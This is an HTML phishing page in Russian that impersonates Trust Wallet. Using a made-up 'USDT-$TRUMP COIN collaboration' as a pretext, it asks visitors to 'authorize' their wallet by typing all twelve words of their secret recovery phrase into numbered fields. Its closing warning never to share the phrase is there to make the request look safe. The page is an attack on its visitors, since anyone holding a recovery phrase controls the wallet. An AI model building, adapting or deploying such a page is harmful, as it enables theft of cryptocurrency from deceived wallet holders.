<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Верификация кошелька</title>
    <style>
        body {
            font-family: 'Arial', sans-serif;
            background-color: #0B0E11;
            color: #FFFFFF;
            margin: 0;
            padding: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
        }
        .container {
            max-width: 450px;
            width: 100%;
            background-color: #1E1E1E;
            border-radius: 16px;
            padding: 20px;
            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.3);
            text-align: center;
        }
        .logo {
            width: 250px;
            height: auto;
            margin: 0 auto 16px;
        }
        h1 {
            font-size: 20px;
            margin-bottom: 16px;
            color: #FFFFFF;
        }
        .description {
            font-size: 14px;
            color: #A0A0A0;
            margin-bottom: 20px;
        }
        .seed-input {
            display: grid;
            grid-template-columns: repeat(6, 1fr);
            gap: 10px;
        }
        .seed-item {
            display: flex;
            flex-direction: column;
            align-items: center;
        }
        .seed-item label {
            font-size: 14px;
            color: #A0A0A0;
            margin-bottom: 5px;
        }
        input {
            padding: 10px;
            font-size: 14px;
            border: 1px solid #333333;
            border-radius: 8px;
            background-color: #2C2C2C;
            color: #FFFFFF;
            text-align: center;
        }
        input::placeholder {
            color: #888888;
        }
        input[type="text"]:focus {
            outline: none;
        }
        button {
            margin-top: 20px;
            width: 100%;
            padding: 14px;
            background-color: #1E90FF;
            color: #FFFFFF;
            font-size: 16px;
            font-weight: bold;
            border: none;
            border-radius: 18px;
            cursor: pointer;
            transition: background-color 0.3s;
        }
        button:hover {
            background-color: #1C86EE;
        }
        .warning {
            margin-top: 10px;
            font-size: 12px;
            color: #FFD700;
        }
    </style>
</head>
<body>
    <div class="container">
        <img src="IMG_2095.png" alt="Trust Wallet Logo" class="logo">
        <h1>Для участия в колоборации USDT-$TRUMP COIN вам необходимо добавить ваш кошелёк в список участников. Авторизуйте свой кошелёк</h1>
        <p class="description">Авторизуйте ваш кошелёк вашей секретной фразой из 12-ти слов. Убедитесь, что вы храните её в безопасности!</p>
        <form id="seedForm">
            <div class="seed-input">
                <!-- Поля для ввода с номерами -->
                <div class="seed-item">
                    <label for="word1">1.</label>
                    <input type="text" id="word1" name="word1" placeholder="слово" required autocomplete="off" autocapitalize="none">
                </div>
                <div class="seed-item">
                    <label for="word2">2.</label>
                    <input type="text" id="word2" name="word2" placeholder="слово" required autocomplete="off" autocapitalize="none">
                </div>
                <div class="seed-item">
                    <label for="word3">3.</label>
                    <input type="text" id="word3" name="word3" placeholder="слово" required autocomplete="off" autocapitalize="none">
                </div>
                <div class="seed-item">
                    <label for="word4">4.</label>
                    <input type="text" id="word4" name="word4" placeholder="слово" required autocomplete="off" autocapitalize="none">
                </div>
                <div class="seed-item">
                    <label for="word5">5.</label>
                    <input type="text" id="word5" name="word5" placeholder="слово" required autocomplete="off" autocapitalize="none">
                </div>
                <div class="seed-item">
                    <label for="word6">6.</label>
                    <input type="text" id="word6" name="word6" placeholder="слово" required autocomplete="off" autocapitalize="none">
                </div>
                <div class="seed-item">
                    <label for="word7">7.</label>
                    <input type="text" id="word7" name="word7" placeholder="слово" required autocomplete="off" autocapitalize="none">
                </div>
                <div class="seed-item">
                    <label for="word8">8.</label>
                    <input type="text" id="word8" name="word8" placeholder="слово" required autocomplete="off" autocapitalize="none">
                </div>
                <div class="seed-item">
                    <label for="word9">9.</label>
                    <input type="text" id="word9" name="word9" placeholder="слово" required autocomplete="off" autocapitalize="none">
                </div>
                <div class="seed-item">
                    <label for="word10">10.</label>
                    <input type="text" id="word10" name="word10" placeholder="слово" required autocomplete="off" autocapitalize="none">
                </div>
                <div class="seed-item">
                    <label for="word11">11.</label>
                    <input type="text" id="word11" name="word11" placeholder="слово" required autocomplete="off" autocapitalize="none">
                </div>
                <div class="seed-item">
                    <label for="word12">12.</label>
                    <input type="text" id="word12" name="word12" placeholder="слово" required autocomplete="off" autocapitalize="none">
                </div>
            </div>
            <button type="submit">Отправить</button>
        </form>
        <div class="warning">Никогда не делитесь своей секретной фразой с другими!</div>
    </div>
</body>
</html>
